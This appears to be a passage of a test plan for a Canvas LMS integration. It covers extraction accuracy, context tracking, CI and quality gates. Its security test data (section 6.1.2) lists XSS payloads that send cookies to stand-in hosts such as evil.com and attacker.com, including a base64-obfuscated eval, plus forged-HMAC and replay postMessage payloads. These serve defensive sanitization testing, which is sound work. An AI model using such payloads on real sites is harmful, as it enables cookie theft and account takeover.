### 5.1 Content Extraction Accuracy Testing

**Objective:** Validate >95% Canvas page type detection, >85% concept extraction accuracy, >90% metadata completeness

#### 5.1.1 Content Type Detection Testing

```typescript
interface ContentTypeTestCase {
  pageName: string;
  canvasUrl: string;
  expectedType: CanvasPageType;
  contentComplexity: 'simple' | 'medium' | 'complex';
  expectedMetadata: string[];
  expectedConcepts: number; // minimum concepts expected
}

type CanvasPageType = 'assignment' | 'quiz' | 'discussion' | 'module' | 'page' | 'announcement' | 'syllabus' | 'gradebook';

export const contentTypeTestCases: ContentTypeTestCase[] = [
  {
    pageName: 'Programming Assignment',
    canvasUrl: '/courses/123/assignments/456',
    expectedType: 'assignment',
    contentComplexity: 'complex',
    expectedMetadata: ['title', 'instructions', 'dueDate', 'points', 'submissionTypes'],
    expectedConcepts: 8
  },
  {
    pageName: 'Multiple Choice Quiz',
    canvasUrl: '/courses/123/quizzes/789',
    expectedType: 'quiz',
    contentComplexity: 'medium',
    expectedMetadata: ['title', 'timeLimit', 'attempts', 'questions'],
    expectedConcepts: 5
  },
  {
    pageName: 'Course Discussion Forum',
    canvasUrl: '/courses/123/discussion_topics/101',
    expectedType: 'discussion',
    contentComplexity: 'medium',
    expectedMetadata: ['title', 'prompt', 'posts', 'participants'],
    expectedConcepts: 6
  },
  {
    pageName: 'Learning Module',
    canvasUrl: '/courses/123/modules/202',
    expectedType: 'module',
    contentComplexity: 'complex',
    expectedMetadata: ['title', 'items', 'requirements', 'prerequisites'],
    expectedConcepts: 10
  },
  {
    pageName: 'Course Content Page',
    canvasUrl: '/courses/123/pages/course-overview',
    expectedType: 'page',
    contentComplexity: 'simple',
    expectedMetadata: ['title', 'content', 'lastModified'],
    expectedConcepts: 4
  },
  {
    pageName: 'Course Announcement',
    canvasUrl: '/courses/123/announcements/303',
    expectedType: 'announcement',
    contentComplexity: 'simple',
    expectedMetadata: ['title', 'message', 'publishDate'],
    expectedConcepts: 3
  }
];
```

#### 5.1.2 Content Extraction Accuracy Tests

```typescript
describe('Canvas Content Extraction Accuracy', () => {
  let contentExtractor: ContentExtractionService;
  let contentAnalyzer: ContentAnalysisService;
  let accuracyValidator: ExtractionAccuracyValidator;

  beforeEach(() => {
    contentExtractor = new ContentExtractionService();
    contentAnalyzer = new ContentAnalysisService();
    accuracyValidator = new ExtractionAccuracyValidator();
  });

  describe('Page Type Detection Accuracy', () => {
    contentTypeTestCases.forEach(testCase => {
      it(`should correctly identify ${testCase.pageName} as ${testCase.expectedType}`, async () => {
        const mockCanvasPage = await createMockCanvasPage(testCase);

        const extractionResult = await contentExtractor.extractPageContent(mockCanvasPage);

        expect(extractionResult.pageType).toBe(testCase.expectedType);
        expect(extractionResult.confidence).toBeGreaterThan(0.9); // >90% confidence
        expect(extractionResult.extractionMethod).toBeDefined();
      });
    });

    it('should achieve >95% page type detection accuracy across all test cases', async () => {
      const results = await Promise.all(
        contentTypeTestCases.map(async testCase => {
          const mockCanvasPage = await createMockCanvasPage(testCase);
          const extractionResult = await contentExtractor.extractPageContent(mockCanvasPage);

          return {
            expected: testCase.expectedType,
            actual: extractionResult.pageType,
            correct: extractionResult.pageType === testCase.expectedType,
            confidence: extractionResult.confidence
          };
        })
      );

      const accuracy = results.filter(r => r.correct).length / results.length;
      const avgConfidence = results.reduce((sum, r) => sum + r.confidence, 0) / results.length;

      expect(accuracy).toBeGreaterThan(0.95); // >95% accuracy target
      expect(avgConfidence).toBeGreaterThan(0.85); // >85% average confidence

      console.log(`Page type detection accuracy: ${(accuracy * 100).toFixed(1)}%`);
      console.log(`Average confidence: ${(avgConfidence * 100).toFixed(1)}%`);
    });
  });

  describe('Metadata Extraction Completeness', () => {
    contentTypeTestCases.forEach(testCase => {
      it(`should extract >90% of expected metadata for ${testCase.pageName}`, async () => {
        const mockCanvasPage = await createMockCanvasPage(testCase);
        const extractionResult = await contentExtractor.extractPageContent(mockCanvasPage);

        const extractedMetadataKeys = Object.keys(extractionResult.metadata);
        const expectedMetadataKeys = testCase.expectedMetadata;

        const metadataCompleteness = expectedMetadataKeys.filter(key =>
          extractedMetadataKeys.includes(key)
        ).length / expectedMetadataKeys.length;

        expect(metadataCompleteness).toBeGreaterThan(0.9); // >90% metadata completeness

        // Validate critical metadata fields
        if (testCase.expectedType === 'assignment') {
          expect(extractionResult.metadata.title).toBeDefined();
          expect(extractionResult.metadata.instructions).toBeDefined();
          expect(extractionResult.metadata.dueDate).toBeDefined();
        }

        if (testCase.expectedType === 'quiz') {
          expect(extractionResult.metadata.title).toBeDefined();
          expect(extractionResult.metadata.questions).toBeDefined();
        }
      });
    });
  });

  describe('Learning Concept Extraction', () => {
    contentTypeTestCases.forEach(testCase => {
      it(`should extract minimum ${testCase.expectedConcepts} concepts from ${testCase.pageName}`, async () => {
        const mockCanvasPage = await createMockCanvasPage(testCase);
        const extractionResult = await contentExtractor.extractPageContent(mockCanvasPage);

        const analysisResult = await contentAnalyzer.analyzeCanvasContent(extractionResult.content);

        expect(analysisResult.concepts.length).toBeGreaterThanOrEqual(testCase.expectedConcepts);
        expect(analysisResult.learningObjectives.length).toBeGreaterThan(0);
        expect(analysisResult.difficulty).toBeOneOf(['beginner', 'intermediate', 'advanced']);

        // Validate concept quality
        analysisResult.concepts.forEach(concept => {
          expect(concept.confidence).toBeGreaterThan(0.6); // >60% confidence per concept
          expect(concept.category).toBeDefined();
          expect(concept.keywords).toHaveLength.greaterThan(0);
        });
      });
    });

    it('should achieve >85% concept extraction accuracy', async () => {
      // Test with known content that has ground truth concept labels
      const groundTruthTestCases = await loadGroundTruthConceptTestCases();

      const conceptExtractionResults = await Promise.all(
        groundTruthTestCases.map(async testCase => {
          const extractionResult = await contentExtractor.extractPageContent(testCase.canvasPage);
          const analysisResult = await contentAnalyzer.analyzeCanvasContent(extractionResult.content);

          return accuracyValidator.validateConceptExtraction(
            analysisResult.concepts,
            testCase.groundTruthConcepts
          );
        })
      );

      const avgPrecision = conceptExtractionResults.reduce((sum, r) => sum + r.precision, 0) / conceptExtractionResults.length;
      const avgRecall = conceptExtractionResults.reduce((sum, r) => sum + r.recall, 0) / conceptExtractionResults.length;
      const avgF1Score = conceptExtractionResults.reduce((sum, r) => sum + r.f1Score, 0) / conceptExtractionResults.length;

      expect(avgPrecision).toBeGreaterThan(0.85); // >85% precision
      expect(avgRecall).toBeGreaterThan(0.80); // >80% recall
      expect(avgF1Score).toBeGreaterThan(0.82); // >82% F1 score

      console.log(`Concept extraction accuracy:`, {
        precision: `${(avgPrecision * 100).toFixed(1)}%`,
        recall: `${(avgRecall * 100).toFixed(1)}%`,
        f1Score: `${(avgF1Score * 100).toFixed(1)}%`
      });
    });
  });
});
```

### 5.2 Context Tracking Reliability Testing

#### 5.2.1 Real-Time Context Updates

```typescript
describe('Canvas Context Tracking Reliability', () => {
  let contextTracker: CanvasContextTracker;
  let contextValidator: ContextAccuracyValidator;

  beforeEach(() => {
    contextTracker = new CanvasContextTracker();
    contextValidator = new ContextAccuracyValidator();
  });

  describe('Real-Time Context Updates', () => {
    it('should maintain >95% context accuracy during navigation', async () => {
      const sessionId = 'test-session-context-nav';
      const navigationSequence = [
        { type: 'assignment', url: '/courses/123/assignments/456', expectedContext: 'assignment-456' },
        { type: 'quiz', url: '/courses/123/quizzes/789', expectedContext: 'quiz-789' },
        { type: 'discussion', url: '/courses/123/discussion_topics/101', expectedContext: 'discussion-101' },
        { type: 'module', url: '/courses/123/modules/202', expectedContext: 'module-202' }
      ];

      let contextAccuracyResults = [];

      for (const navEvent of navigationSequence) {
        // Simulate Canvas navigation
        await contextTracker.updateContext(sessionId, {
          type: 'canvas.navigation',
          pageUrl: navEvent.url,
          pageType: navEvent.type,
          timestamp: Date.now()
        });

        // Verify context update
        const currentContext = await contextTracker.getCurrentContext(sessionId);
        const contextAccuracy = contextValidator.validateContext(currentContext, navEvent.expectedContext);

        contextAccuracyResults.push(contextAccuracy);

        expect(currentContext.currentPageType).toBe(navEvent.type);
        expect(currentContext.lastUpdated).toBeDefined();
        expect(Date.now() - new Date(currentContext.lastUpdated).getTime()).toBeLessThan(1000); // <1s latency
      }

      const avgContextAccuracy = contextAccuracyResults.reduce((sum, acc) => sum + acc, 0) / contextAccuracyResults.length;
      expect(avgContextAccuracy).toBeGreaterThan(0.95); // >95% context accuracy
    });

    it('should persist context across browser refresh', async () => {
      const sessionId = 'test-session-refresh';

      // Set initial context
      await contextTracker.updateContext(sessionId, {
        type: 'canvas.navigation',
        pageUrl: '/courses/123/assignments/456',
        pageType: 'assignment',
        contentData: { title: 'Programming Assignment 1' }
      });

      const preRefreshContext = await contextTracker.getCurrentContext(sessionId);

      // Simulate browser refresh (context tracker restart)
      await contextTracker.handleBrowserRefresh(sessionId);

      // Restore context
      const postRefreshContext = await contextTracker.getCurrentContext(sessionId);

      expect(postRefreshContext.currentPageType).toBe(preRefreshContext.currentPageType);
      expect(postRefreshContext.currentPageUrl).toBe(preRefreshContext.currentPageUrl);
      expect(postRefreshContext.sessionId).toBe(sessionId);
      expect(postRefreshContext.contextRestored).toBe(true);
    });

    it('should handle multi-tab context management', async () => {
      const baseSessionId = 'test-session-multi-tab';
      const tab1SessionId = `${baseSessionId}-tab1`;
      const tab2SessionId = `${baseSessionId}-tab2`;

      // Tab 1: Assignment page
      await contextTracker.updateContext(tab1SessionId, {
        type: 'canvas.navigation',
        pageUrl: '/courses/123/assignments/456',
        pageType: 'assignment'
      });

      // Tab 2: Quiz page
      await contextTracker.updateContext(tab2SessionId, {
        type: 'canvas.navigation',
        pageUrl: '/courses/123/quizzes/789',
        pageType: 'quiz'
      });

      // Verify independent context tracking
      const tab1Context = await contextTracker.getCurrentContext(tab1SessionId);
      const tab2Context = await contextTracker.getCurrentContext(tab2SessionId);

      expect(tab1Context.currentPageType).toBe('assignment');
      expect(tab2Context.currentPageType).toBe('quiz');
      expect(tab1Context.sessionId).not.toBe(tab2Context.sessionId);

      // Verify context isolation
      await contextTracker.updateContext(tab1SessionId, {
        type: 'canvas.navigation',
        pageUrl: '/courses/123/modules/202',
        pageType: 'module'
      });

      const updatedTab1Context = await contextTracker.getCurrentContext(tab1SessionId);
      const unchangedTab2Context = await contextTracker.getCurrentContext(tab2SessionId);

      expect(updatedTab1Context.currentPageType).toBe('module');
      expect(unchangedTab2Context.currentPageType).toBe('quiz'); // Should be unchanged
    });
  });

  describe('Context Synchronization Performance', () => {
    it('should synchronize context updates within 100ms', async () => {
      const sessionId = 'test-session-sync-perf';
      const contextUpdates = 50; // 50 rapid context updates

      const updatePromises = Array.from({ length: contextUpdates }, async (_, i) => {
        const startTime = Date.now();

        await contextTracker.updateContext(sessionId, {
          type: 'canvas.navigation',
          pageUrl: `/courses/123/assignments/${456 + i}`,
          pageType: 'assignment',
          sequence: i
        });

        return Date.now() - startTime;
      });

      const updateLatencies = await Promise.all(updatePromises);
      const avgUpdateLatency = updateLatencies.reduce((sum, latency) => sum + latency, 0) / updateLatencies.length;
      const p95UpdateLatency = updateLatencies.sort((a, b) => a - b)[Math.floor(updateLatencies.length * 0.95)];

      expect(avgUpdateLatency).toBeLessThan(50); // <50ms average
      expect(p95UpdateLatency).toBeLessThan(100); // <100ms P95
    });
  });
});
```

---

## 6. Test Data Requirements

### 6.1 Canvas Content Test Data

#### 6.1.1 Realistic Canvas Page Samples

```typescript
interface CanvasPageSample {
  pageType: CanvasPageType;
  complexity: 'simple' | 'medium' | 'complex';
  contentElements: string[];
  sampleHtml: string;
  expectedConcepts: string[];
  expectedMetadata: Record<string, any>;
}

export const canvasPageSamples: CanvasPageSample[] = [
  {
    pageType: 'assignment',
    complexity: 'complex',
    contentElements: ['instructions', 'rubric', 'submissions', 'code-blocks', 'math-equations'],
    sampleHtml: `
      <div class="assignment-description">
        <h1>Data Structures Programming Assignment</h1>
        <div class="points">Points: 100</div>
        <div class="due-date">Due: Oct 15, 2025 at 11:59pm</div>

        <div class="instructions">
          <h2>Overview</h2>
          <p>Implement a balanced binary search tree with the following operations:</p>
          <ul>
            <li>Insert(key, value) - O(log n) time complexity</li>
            <li>Delete(key) - O(log n) time complexity</li>
            <li>Search(key) - O(log n) time complexity</li>
            <li>Traverse() - In-order traversal</li>
          </ul>

          <h2>Requirements</h2>
          <div class="requirement">
            <p>Your implementation must:</p>
            <ol>
              <li>Use AVL tree balancing algorithm</li>
              <li>Include comprehensive unit tests (>90% coverage)</li>
              <li>Handle edge cases (empty tree, single node, etc.)</li>
              <li>Follow proper coding standards and documentation</li>
            </ol>
          </div>

          <h2>Starter Code</h2>
          <pre><code class="language-java">
public class AVLTree<K extends Comparable<K>, V> {
    private TreeNode<K, V> root;

    public void insert(K key, V value) {
        // TODO: Implement AVL insertion with balancing
    }

    public V search(K key) {
        // TODO: Implement search operation
        return null;
    }
}
          </code></pre>

          <h2>Submission Guidelines</h2>
          <p>Submit your solution as a single .java file through Canvas.
          Include a README with time complexity analysis and testing approach.</p>
        </div>
      </div>
    `,
    expectedConcepts: [
      'binary-search-tree', 'avl-tree', 'data-structures', 'algorithms',
      'time-complexity', 'tree-balancing', 'unit-testing', 'java-programming'
    ],
    expectedMetadata: {
      title: 'Data Structures Programming Assignment',
      points: 100,
      dueDate: '2025-10-15T23:59:00Z',
      submissionTypes: ['online_upload'],
      estimatedDuration: 480 // 8 hours
    }
  },

  {
    pageType: 'quiz',
    complexity: 'medium',
    contentElements: ['questions', 'time-limit', 'multiple-choice', 'code-snippets'],
    sampleHtml: `
      <div class="quiz-container">
        <h1>Midterm Exam: Computer Science Fundamentals</h1>
        <div class="quiz-info">
          <p>Time Limit: 90 minutes</p>
          <p>Attempts: 1</p>
          <p>Total Points: 50</p>
        </div>

        <div class="question" data-question-id="1">
          <h3>Question 1 (5 points)</h3>
          <p>What is the worst-case time complexity of QuickSort algorithm?</p>
          <div class="answers">
            <label><input type="radio" name="q1" value="a"> O(n log n)</label>
            <label><input type="radio" name="q1" value="b"> O(n²)</label>
            <label><input type="radio" name="q1" value="c"> O(n)</label>
            <label><input type="radio" name="q1" value="d"> O(log n)</label>
          </div>
        </div>

        <div class="question" data-question-id="2">
          <h3>Question 2 (10 points)</h3>
          <p>Analyze the following code snippet and determine its output:</p>
          <pre><code class="language-python">
def factorial(n):
    if n <= 1:
        return 1
    return n * factorial(n - 1)

print(factorial(5))
          </code></pre>
          <textarea name="q2" rows="4" placeholder="Enter your answer here..."></textarea>
        </div>
      </div>
    `,
    expectedConcepts: [
      'algorithms', 'time-complexity', 'quicksort', 'recursion',
      'factorial', 'python-programming', 'computer-science'
    ],
    expectedMetadata: {
      title: 'Midterm Exam: Computer Science Fundamentals',
      timeLimit: 90,
      attempts: 1,
      totalPoints: 50,
      questionCount: 2
    }
  }
];
```

#### 6.1.2 Attack Payload Test Data

```typescript
interface SecurityTestPayload {
  attackType: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  payload: string;
  expectedBehavior: 'blocked' | 'sanitized' | 'logged';
  description: string;
}

export const xssAttackPayloads: SecurityTestPayload[] = [
  {
    attackType: 'script-injection',
    severity: 'critical',
    payload: '<script>fetch("https://evil.com/steal", {method: "POST", body: document.cookie})</script>',
    expectedBehavior: 'blocked',
    description: 'Cookie stealing via external fetch'
  },
  {
    attackType: 'event-handler',
    severity: 'high',
    payload: '<img src="x" onerror="alert(\'XSS\'); fetch(\'https://attacker.com/\' + document.cookie)">',
    expectedBehavior: 'sanitized',
    description: 'Image event handler with data exfiltration'
  },
  {
    attackType: 'svg-script',
    severity: 'high',
    payload: '<svg onload="eval(atob(\'YWxlcnQoJ1hTUycpOyBmZXRjaCgnaHR0cHM6Ly9hdHRhY2tlci5jb20vJyArIGRvY3VtZW50LmNvb2tpZSk=\'))">',
    expectedBehavior: 'blocked',
    description: 'Base64 encoded script execution in SVG'
  },
  {
    attackType: 'iframe-injection',
    severity: 'medium',
    payload: '<iframe src="javascript:alert(\'XSS\')" style="display:none"></iframe>',
    expectedBehavior: 'blocked',
    description: 'Hidden iframe with JavaScript execution'
  },
  {
    attackType: 'css-expression',
    severity: 'medium',
    payload: '<div style="background: expression(alert(\'XSS\'))">Content</div>',
    expectedBehavior: 'sanitized',
    description: 'CSS expression injection (IE legacy)'
  }
];

export const postMessageAttackPayloads: SecurityTestPayload[] = [
  {
    attackType: 'origin-spoofing',
    severity: 'critical',
    payload: JSON.stringify({
      origin: 'https://evil.instructure.com.attacker.com',
      data: {
        type: 'canvas.content.extracted',
        maliciousData: '<script>steal_data()</script>'
      }
    }),
    expectedBehavior: 'blocked',
    description: 'Domain spoofing with malicious subdomain'
  },
  {
    attackType: 'hmac-bypass',
    severity: 'critical',
    payload: JSON.stringify({
      origin: 'https://canvas.instructure.com',
      data: {
        type: 'canvas.admin.escalate',
        signature: 'forged-signature-123'
      }
    }),
    expectedBehavior: 'blocked',
    description: 'Privilege escalation with forged HMAC'
  },
  {
    attackType: 'replay-attack',
    severity: 'high',
    payload: JSON.stringify({
      origin: 'https://canvas.instructure.com',
      data: {
        type: 'canvas.grade.update',
        nonce: 'previously-used-nonce',
        timestamp: Date.now() - 600000 // 10 minutes old
      }
    }),
    expectedBehavior: 'blocked',
    description: 'Replay attack with old nonce and timestamp'
  }
];
```

### 6.2 Performance Test Datasets

#### 6.2.1 Load Testing Data Generation

```typescript
interface LoadTestDataProfile {
  profileName: string;
  userCount: number;
  sessionDuration: number; // minutes
  actionsPerMinute: number;
  contentComplexity: ContentComplexityProfile;
  canvasEnvironment: string;
}

interface ContentComplexityProfile {
  averagePageSize: number; // KB
  mathEquationCount: number;
  codeBlockCount: number;
  embeddedMediaCount: number;
  interactiveElementCount: number;
}

export const loadTestProfiles: LoadTestDataProfile[] = [
  {
    profileName: 'Normal Class Activity',
    userCount: 100,
    sessionDuration: 45,
    actionsPerMinute: 12,
    contentComplexity: {
      averagePageSize: 150,
      mathEquationCount: 3,
      codeBlockCount: 2,
      embeddedMediaCount: 1,
      interactiveElementCount: 5
    },
    canvasEnvironment: 'canvas.instructure.com'
  },
  {
    profileName: 'Exam Period Peak',
    userCount: 500,
    sessionDuration: 120,
    actionsPerMinute: 8,
    contentComplexity: {
      averagePageSize: 200,
      mathEquationCount: 8,
      codeBlockCount: 5,
      embeddedMediaCount: 2,
      interactiveElementCount: 12
    },
    canvasEnvironment: 'canvas.instructure.com'
  },
  {
    profileName: 'Scale Test Maximum',
    userCount: 1000,
    sessionDuration: 60,
    actionsPerMinute: 15,
    contentComplexity: {
      averagePageSize: 300,
      mathEquationCount: 12,
      codeBlockCount: 8,
      embeddedMediaCount: 4,
      interactiveElementCount: 20
    },
    canvasEnvironment: 'canvas.instructure.com'
  }
];

export class LoadTestDataGenerator {
  generateRealisticCanvasSession(profile: LoadTestDataProfile): CanvasSession {
    const session = {
      sessionId: `load-test-${Date.now()}-${Math.random()}`,
      userId: this.generateUserId(),
      courseId: this.generateCourseId(),
      startTime: Date.now(),
      actions: []
    };

    const actionCount = profile.sessionDuration * profile.actionsPerMinute;

    for (let i = 0; i < actionCount; i++) {
      const action = this.generateRealisticAction(profile.contentComplexity);
      session.actions.push(action);
    }

    return session;
  }

  private generateRealisticAction(complexity: ContentComplexityProfile): CanvasAction {
    const actionTypes = ['navigation', 'content_extraction', 'quiz_interaction', 'assignment_view'];
    const actionType = actionTypes[Math.floor(Math.random() * actionTypes.length)];

    return {
      type: actionType,
      timestamp: Date.now(),
      data: this.generateActionData(actionType, complexity)
    };
  }
}
```

---

## 7. Test Automation Strategy

### 7.1 Continuous Integration Testing

#### 7.1.1 CI/CD Pipeline Integration

```yaml
# .github/workflows/canvas-integration-tests.yml
name: Canvas Integration Tests

on:
  push:
    branches: [main, develop]
    paths: ['src/features/canvas-integration/**', 'tests/**']
  pull_request:
    branches: [main]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: '18'
      - run: npm ci
      - run: npm run test:unit -- --coverage
      - uses: codecov/codecov-action@v3

  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: '18'
      - run: npm ci
      - run: npm run test:security
      - run: npm run security:scan

  canvas-integration:
    runs-on: ubuntu-latest
    needs: [unit-tests, security-tests]
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: '18'
      - run: npm ci
      - run: npm run test:canvas-integration
        env:
          CANVAS_TEST_API_KEY: ${{ secrets.CANVAS_TEST_API_KEY }}
          CANVAS_TEST_DOMAIN: ${{ secrets.CANVAS_TEST_DOMAIN }}

  performance-tests:
    runs-on: ubuntu-latest
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: '18'
      - run: npm ci
      - run: npm run test:performance
      - name: Store performance results
        uses: actions/upload-artifact@v3
        with:
          name: performance-results
          path: test-results/performance/
```

#### 7.1.2 Automated Quality Gates

```typescript
// scripts/quality-gates.ts
interface QualityGateConfig {
  name: string;
  metric: string;
  threshold: number;
  critical: boolean;
}

const canvasIntegrationQualityGates: QualityGateConfig[] = [
  // Security Gates (Critical)
  {
    name: 'Origin Validation Success Rate',
    metric: 'security.origin_validation_success_rate',
    threshold: 100,
    critical: true
  },
  {
    name: 'HMAC Validation Success Rate',
    metric: 'security.hmac_validation_success_rate',
    threshold: 100,
    critical: true
  },
  {
    name: 'Content Sanitization Success Rate',
    metric: 'security.content_sanitization_success_rate',
    threshold: 100,
    critical: true
  },

  // Performance Gates (Critical)
  {
    name: 'Content Extraction Latency P95',
    metric: 'performance.content_extraction_latency_p95',
    threshold: 500, // 500ms
    critical: true
  },
  {
    name: 'Database Write Latency P95',
    metric: 'performance.db_write_latency_p95',
    threshold: 100, // 100ms
    critical: true
  },
  {
    name: 'Concurrent User Support',
    metric: 'performance.max_concurrent_users',
    threshold: 1000,
    critical: true
  },

  // Functional Gates (Critical)
  {
    name: 'Page Type Detection Accuracy',
    metric: 'functional.page_type_detection_accuracy',
    threshold: 95, // 95%
    critical: true
  },
  {
    name: 'Content Extraction Success Rate',
    metric: 'functional.content_extraction_success_rate',
    threshold: 99, // 99%
    critical: true
  },

  // Quality Gates (Non-Critical)
  {
    name: 'Unit Test Coverage',
    metric: 'quality.unit_test_coverage',
    threshold: 80, // 80%
    critical: false
  },
  {
    name: 'Integration Test Coverage',
    metric: 'quality.integration_test_coverage',
    threshold: 90, // 90%
    critical: false
  }
];

export class CanvasQualityGateValidator {
  async validateAllGates(): Promise<QualityGateResult[]> {
    const results: QualityGateResult[] = [];

    for (const gate of canvasIntegrationQualityGates) {
      const result = await this.validateGate(gate);
      results.push(result);

      if (gate.critical && !result.passed) {
        throw new QualityGateError(
          `CRITICAL QUALITY GATE FAILED: ${gate.name}`,
          result
        );
      }
    }

    return results;
  }

  private async validateGate(gate: QualityGateConfig): Promise<QualityGateResult> {
    const metricValue = await this.collectMetric(gate.metric);
    const passed = this.evaluateThreshold(gate.metric, metricValue, gate.threshold);

    return {
      gateName: gate.name,
      metric: gate.metric,
      actualValue: metricValue,
      threshold: gate.threshold,
      passed,
      critical: gate.critical,
      timestamp: new Date().toISOString()
    };
  }
}
```

### 7.2 Canvas Environment Test Automation

#### 7.2.1 Multi-Environment Test Matrix

```typescript
// test-automation/canvas-environment-matrix.ts
export class CanvasEnvironmentTestMatrix {
  private environments = [
    {
      name: 'Canvas Cloud Production',
      domains: ['canvas.instructure.com'],
      testPriority: 'critical'
    },
    {
      name: 'Canvas Cloud Beta',
      domains: ['canvas.beta.instructure.com'],
      testPriority: 'high'
    },
    {
      name: 'Institution Hosted',
      domains: ['*.edu', '*.ac.uk'],
      testPriority: 'medium'
    },
    {
      name: 'Canvas Test Environment',
      domains: ['canvas.test.instructure.com'],
      testPriority: 'high'
    }
  ];

  async runEnvironmentTestSuite(): Promise<EnvironmentTestResults[]> {
    const results = await Promise.all(
      this.environments.map(env => this.testEnvironment(env))
    );

    return results;
  }

  private async testEnvironment(environment: CanvasEnvironment): Promise<EnvironmentTestResults> {
    const testSuite = new CanvasEnvironmentTestSuite(environment);

    const results = await Promise.all([
      testSuite.testPostMessageCommunication(),
      testSuite.testContentExtraction(),
      testSuite.testSecurityValidation(),
      testSuite.testPerformanceMetrics(),
      testSuite.testFallbackMechanisms()
    ]);

    return {
      environment: environment.name,
      testResults: results,
      overallStatus: this.calculateOverallStatus(results),
      timestamp: new Date().toISOString()
    };
  }
}
```

---

## 8. Tools and Frameworks

### 8.1 Testing Technology Stack

**Core Testing Framework:**
- **Vitest** - Unit and integration testing with TypeScript support
- **Playwright** - End-to-end testing with Canvas browser simulation
- **MSW (Mock Service Worker)** - Canvas API mocking and simulation

**Security Testing Tools:**
- **Custom PostMessage Security Tester** - Origin validation and HMAC testing
- **DOMPurify Test Suite** - Content sanitization validation
- **OWASP ZAP Integration** - Automated security scanning

**Performance Testing Tools:**
- **Artillery.io** - Load testing for postMessage throughput
- **Cloudflare Workers Performance Monitor** - Real-time performance metrics
- **Custom Canvas Load Simulator** - Canvas-specific load generation

**Canvas-Specific Testing:**
- **Canvas API Test Harness** - Multi-environment Canvas testing
- **PostMessage Security Validator** - Origin and signature validation
- **Content Extraction Accuracy Validator** - Concept and metadata validation

### 8.2 Test Infrastructure Architecture

```typescript
// testing-infrastructure/CanvasTestHarness.ts
export class CanvasIntegrationTestHarness {
  private canvasSimulator: CanvasEnvironmentSimulator;
  private securityTester: PostMessageSecurityTester;
  private performanceMonitor: CanvasPerformanceMonitor;
  private contentValidator: ContentExtractionValidator;

  constructor(environment: CanvasEnvironment) {
    this.canvasSimulator = new CanvasEnvironmentSimulator(environment);
    this.securityTester = new PostMessageSecurityTester();
    this.performanceMonitor = new CanvasPerformanceMonitor();
    this.contentValidator = new ContentExtractionValidator();
  }

  async runComprehensiveTestSuite(): Promise<CanvasTestResults> {
    const results = {
      security: await this.runSecurityTests(),
      performance: await this.runPerformanceTests(),
      functional: await this.runFunctionalTests(),
      integration: await this.runIntegrationTests()
    };

    return {
      environment: this.canvasSimulator.environment.name,
      timestamp: new Date().toISOString(),
      results,
      overallStatus: this.calculateOverallStatus(results)
    };
  }

  private async runSecurityTests(): Promise<SecurityTestResults> {
    return await this.securityTester.runAllSecurityTests([
      'origin-validation',
      'hmac-validation',
      'content-sanitization',
      'replay-protection',
      'rate-limiting'
    ]);
  }

  private async runPerformanceTests(): Promise<PerformanceTestResults> {
    return await this.performanceMonitor.runPerformanceTestSuite([
      'content-extraction-latency',
      'db-write-performance',
      'concurrent-user-support',
      'memory-usage-validation'
    ]);
  }
}
```

---

## 9. Implementation Timeline

### 9.1 Test Development Phases

| Phase | Duration | Focus | Deliverables | Success Criteria |
|-------|----------|-------|--------------|------------------|
| **Phase 1** | Week 1-2 | Security Testing Foundation | Security test harness, attack vector tests | 100% attack vectors blocked |
| **Phase 2** | Week 2-3 | Performance Testing Infrastructure | Load testing framework, performance benchmarks | Performance targets met under load |
| **Phase 3** | Week 3-4 | Canvas Integration Testing | Multi-environment tests, browser compatibility | >95% Canvas compatibility |
| **Phase 4** | Week 4-5 | Functional Accuracy Testing | Content extraction tests, concept validation | >95% extraction accuracy |
| **Phase 5** | Week 5-6 | E2E Testing & Quality Gates | Complete workflow tests, automated gates | All quality gates passing |
| **Phase 6** | Week 6+ | Production Monitoring | Real-time metrics, continuous validation | Production quality monitoring |

### 9.2 Critical Path Dependencies

**Prerequisites for Testing Start:**
1. ✅ Repository pattern compliance in `CanvasPostMessageService`
2. ✅ HMAC key management strategy implementation
3. ✅ Content sanitization framework deployment
4. ✅ Canvas test environment access and credentials

**Parallel Development Tracks:**
- **Security Track:** Origin validation, HMAC verification, content sanitization
- **Performance Track:** Load testing, latency optimization, concurrent user support
- **Integration Track:** Canvas environment compatibility, browser testing
- **Functional Track:** Content extraction accuracy, context tracking reliability

---

## 10. Success Criteria & Risk Mitigation

### 10.1 Mandatory Pre-Launch Requirements

**Security Requirements (100% Pass Rate):**
- [ ] **Origin Validation:** Block 100% of malicious origin bypass attempts
- [ ] **HMAC Integrity:** Validate message signatures with 100% accuracy
- [ ] **Content Sanitization:** Block/sanitize 100% of XSS attack vectors
- [ ] **Replay Protection:** Prevent 100% of replay attacks using nonce validation

**Performance Requirements:**
- [ ] **Content Extraction:** <500ms P95 latency for content processing
- [ ] **Database Writes:** <100ms P95 latency for D1 content reference writes
- [ ] **Concurrent Users:** Support >1000 simultaneous Canvas sessions
- [ ] **Memory Efficiency:** <100MB memory usage per Durable Object instance

**Functional Requirements:**
- [ ] **Page Type Detection:** >95% accuracy across Canvas page types
- [ ] **Content Extraction:** >99% success rate for supported Canvas pages
- [ ] **Metadata Completeness:** >90% extraction of available Canvas metadata
- [ ] **Concept Analysis:** >85% accuracy in learning concept identification

**Integration Requirements:**
- [ ] **Canvas Compatibility:** Support 5+ major Canvas environment types
- [ ] **Browser Support:** Work on >95% of Canvas-supported browsers
- [ ] **Mobile Support:** Graceful degradation on Canvas mobile apps
- [ ] **Version Compatibility:** Handle Canvas version differences gracefully

### 10.2 Risk Mitigation Strategies

| Risk Category | Risk Description | Likelihood | Impact | Mitigation Strategy |
|---------------|------------------|------------|---------|-------------------|
| **Security** | PostMessage attack vector success | Low | Critical | Comprehensive penetration testing, security audit |
| **Performance** | Latency targets not met under load | Medium | High | Progressive load testing, performance optimization |
| **Canvas Compatibility** | Canvas environment changes break integration | Medium | High | Multi-environment testing, fallback mechanisms |
| **Content Accuracy** | Concept extraction below accuracy targets | Medium | Medium | Ground truth validation, ML model tuning |
| **Scale** | System fails at target concurrent user count | Low | High | Stress testing, auto-scaling validation |

**Contingency Plans:**
- **Security Failures:** Implement emergency fallback to read-only mode
